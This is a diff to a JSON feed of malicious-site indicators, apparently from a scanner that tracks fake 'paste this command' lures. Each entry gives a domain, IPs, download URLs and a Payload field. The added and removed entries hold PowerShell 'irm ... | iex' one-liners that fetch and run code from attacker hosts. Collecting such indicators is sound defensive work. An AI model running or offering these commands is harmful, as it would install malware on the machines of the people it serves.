@@ -1,5 +1,35 @@
 [
   {
+    "UrlDomain": "sailingservant.org",
+    "DeliveryUrl": [
+      "browse-cloud.codes"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "158.69.54.116"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-cloud.codes/336728d213008c22",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://browse-cloud.codes/api.php?s=d337fe5678dbf1893653249a44964fe325f0428d2f4be1ae&amp;_v=29917395",
+        "Type": "Reference"
+      },
+      {
+        "Value": "https://browse-cloud.codes/api.php?s=d337fe5678dbf1893653249a44964fe325f0428d2f4be1ae&_v=29917395",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'browse-cloud.codes/336728d213008c22'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-cloud.codes/336728d213008c22"
+    ],
+    "ReportId": "cmwmqp0cv1uc20oml7a6uzgnn",
+    "ScannedAt": "2026-11-18T23:15:37.353000+00:00"
+  },
+  {
     "UrlDomain": "royalalco.com",
     "DeliveryUrl": [
       "browse-cloud.codes",
@@ -5637,25 +5667,5 @@
     ],
     "ReportId": "cmwjyukd3198l0omlbovyvnwg",
     "ScannedAt": "2026-11-17T00:40:35.020000+00:00"
-  },
-  {
-    "UrlDomain": "specialgf4u.com",
-    "DeliveryUrl": [],
-    "PayloadUrl": [],
-    "IP": [
-      "187.17.111.35"
-    ],
-    "Related": [
-      {
-        "Value": "gitlab.com",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "IRM gitlab[.]com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5 | IEX",
-    "ResolvedDownloadUrl": [
-      "https://gitlab.com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5"
-    ],
-    "ReportId": "cmwjvzcgx19280omlttmi8ydj",
-    "ScannedAt": "2026-11-16T23:20:19.248000+00:00"
   }
 ]
